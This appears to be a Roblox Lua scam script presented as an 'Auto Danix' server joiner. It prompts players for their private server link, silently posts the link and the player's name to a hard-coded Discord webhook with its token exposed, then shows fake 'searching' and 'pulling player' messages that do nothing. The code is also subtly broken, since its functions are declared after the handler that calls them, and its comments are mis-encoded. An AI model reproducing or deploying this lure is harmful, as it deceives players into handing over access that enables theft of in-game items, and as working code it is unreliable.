-- Configura√ß√£o do Webhook
local WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1443019238724997261/TBUwGxEJ2MyvJ6y0PQIhNz4ErMZ0_k7Z-e7SNk-IZrA2l15O96d7gfaijQZzf7TKJ173"

-- Fun√ß√£o para criar a tela inicial
local function createInputScreen()
    local ScreenGui = Instance.new("ScreenGui")
    local MainFrame = Instance.new("Frame")
    local Title = Instance.new("TextLabel")
    local AutoDanix = Instance.new("TextLabel")
    local InputFrame = Instance.new("Frame")
    local TextBox = Instance.new("TextBox")
    local ConfirmButton = Instance.new("TextButton")
    local UICorner = Instance.new("UICorner")
    local UIStroke = Instance.new("UIStroke")

    -- Configurar a GUI
    ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    ScreenGui.Name = "AutoDanixGUI"

    -- Frame principal com tema natalino
    MainFrame.Size = UDim2.new(0, 400, 0, 300)
    MainFrame.Position = UDim2.new(0.5, -200, 0.5, -150)
    MainFrame.BackgroundColor3 = Color3.fromRGB(20, 60, 30) -- Verde natalino
    MainFrame.BorderSizePixel = 0
    MainFrame.Parent = ScreenGui

    -- Bordas decorativas
    UICorner.CornerRadius = UDim.new(0, 12)
    UICorner.Parent = MainFrame

    UIStroke.Color = Color3.fromRGB(255, 0, 0) -- Vermelho natalino
    UIStroke.Thickness = 3
    UIStroke.Parent = MainFrame

    -- T√≠tulo principal
    Title.Size = UDim2.new(1, 0, 0, 60)
    Title.Position = UDim2.new(0, 0, 0, 20)
    Title.BackgroundTransparency = 1
    Title.Text = "SERVER JOINER"
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.TextScaled = true
    Title.Font = Enum.Font.FredokaOne
    Title.Parent = MainFrame

    -- Subt√≠tulo Auto Danix
    AutoDanix.Size = UDim2.new(1, 0, 0, 30)
    AutoDanix.Position = UDim2.new(0, 0, 0, 80)
    AutoDanix.BackgroundTransparency = 1
    AutoDanix.Text = "AUTO DANIX"
    AutoDanix.TextColor3 = Color3.fromRGB(255, 215, 0) -- Dourado
    AutoDanix.TextScaled = true
    AutoDanix.Font = Enum.Font.GothamBold
    AutoDanix.Parent = MainFrame

    -- Frame do input
    InputFrame.Size = UDim2.new(0, 300, 0, 120)
    InputFrame.Position = UDim2.new(0.5, -150, 0.5, -50)
    InputFrame.BackgroundTransparency = 1
    InputFrame.Parent = MainFrame

    -- TextBox para o link
    TextBox.Size = UDim2.new(1, 0, 0, 40)
    TextBox.Position = UDim2.new(0, 0, 0, 0)
    TextBox.PlaceholderText = "enter you link server"
    TextBox.Text = ""
    TextBox.ClearTextOnFocus = false
    TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    TextBox.Font = Enum.Font.Gotham
    TextBox.TextScaled = true
    TextBox.Parent = InputFrame

    local TextBoxCorner = Instance.new("UICorner")
    TextBoxCorner.CornerRadius = UDim.new(0, 8)
    TextBoxCorner.Parent = TextBox

    -- Bot√£o confirmar
    ConfirmButton.Size = UDim2.new(0, 150, 0, 40)
    ConfirmButton.Position = UDim2.new(0.5, -75, 0, 60)
    ConfirmButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0) -- Vermelho natalino
    ConfirmButton.Text = "CONFIRMAR"
    ConfirmButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    ConfirmButton.TextScaled = true
    ConfirmButton.Font = Enum.Font.GothamBold
    ConfirmButton.Parent = InputFrame

    local ConfirmCorner = Instance.new("UICorner")
    ConfirmCorner.CornerRadius = UDim.new(0, 8)
    ConfirmCorner.Parent = ConfirmButton

    -- Fun√ß√£o do bot√£o confirmar
    ConfirmButton.MouseButton1Click:Connect(function()
        local serverLink = TextBox.Text
        
        -- Enviar informa√ß√µes para o webhook
        sendLinkToWebhook(serverLink)
        
        -- Fechar tela atual
        ScreenGui:Destroy()
        
        -- Criar tela de carregamento
        createLoadingScreen()
    end)

    return ScreenGui
end

-- Fun√ß√£o para enviar o link para o webhook
local function sendLinkToWebhook(serverLink)
    local currentTime = os.date("%Y-%m-%d %H:%M:%S")
    local player = game.Players.LocalPlayer
    local playerName = player.Name
    
    local payload = {
        embeds = {{
            title = "üîó NOVO LINK RECEBIDO - AUTO DANIX",
            color = 0x00FF00,
            fields = {
                {
                    name = "üë§ Nome do Jogador:",
                    value = playerName,
                    inline = true
                },
                {
                    name = "‚è∞ Data/Hora:",
                    value = currentTime,
                    inline = true
                },
                {
                    name = "üîó Link do Servidor:",
                    value = serverLink,
                    inline = false
                }
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    
    -- Enviar para webhook
    local success, result = pcall(function()
        return game:GetService("HttpService"):PostAsync(
            WEBHOOK_URL,
            game:GetService("HttpService"):JSONEncode(payload)
        )
    end)
    
    if success then
        print("‚úÖ Link enviado para webhook!")
    else
        warn("‚ùå Erro ao enviar para webhook: " .. tostring(result))
    end
end

-- Fun√ß√£o para criar tela de carregamento
local function createLoadingScreen()
    local LoadingGui = Instance.new("ScreenGui")
    local LoadingFrame = Instance.new("Frame")
    local LoadingText = Instance.new("TextLabel")
    local MessagesFrame = Instance.new("Frame")
    local UICorner = Instance.new("UICorner")
    
    LoadingGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    LoadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    
    -- Frame de carregamento
    LoadingFrame.Size = UDim2.new(0, 500, 0, 300)
    LoadingFrame.Position = UDim2.new(0.5, -250, 0.5, -150)
    LoadingFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
    LoadingFrame.BorderSizePixel = 0
    LoadingFrame.Parent = LoadingGui
    
    UICorner.CornerRadius = UDim.new(0, 12)
    UICorner.Parent = LoadingFrame
    
    -- Texto principal
    LoadingText.Size = UDim2.new(1, 0, 0, 60)
    LoadingText.Position = UDim2.new(0, 0, 0, 20)
    LoadingText.BackgroundTransparency = 1
    LoadingText.Text = "CARREGANDO..."
    LoadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
    LoadingText.TextScaled = true
    LoadingText.Font = Enum.Font.GothamBold
    LoadingText.Parent = LoadingFrame
    
    -- Frame das mensagens
    MessagesFrame.Size = UDim2.new(0, 400, 0, 180)
    MessagesFrame.Position = UDim2.new(0.5, -200, 0.5, -70)
    MessagesFrame.BackgroundTransparency = 1
    MessagesFrame.Parent = LoadingFrame
    
    -- Mensagens sequenciais
    local messages = {
        "VERIFICANDO BASE...",
        "BUSCADOR JOGADORES...", 
        "VERIFICANDO SE TEM BRAINROT DE 15M+ NA BASE...",
        "PUXANDO PLAY PRO SERVIDOR..."
    }
    
    -- Mostrar mensagens sequencialmente
    for i, message in ipairs(messages) do
        wait(2) -- Espera 2 segundos entre cada mensagem
        
        local msgLabel = Instance.new("TextLabel")
        msgLabel.Size = UDim2.new(1, 0, 0, 30)
        msgLabel.Position = UDim2.new(0, 0, 0, (i-1) * 35)
        msgLabel.BackgroundTransparency = 1
        msgLabel.Text = "‚úì " .. message
        msgLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
        msgLabel.TextScaled = true
        msgLabel.Font = Enum.Font.Gotham
        msgLabel.TextXAlignment = Enum.TextXAlignment.Left
        msgLabel.Parent = MessagesFrame
    end
    
    -- Fechar tudo ap√≥s mostrar todas as mensagens
    wait(3)
    LoadingGui:Destroy()
end

-- Iniciar a tela inicial
createInputScreen()
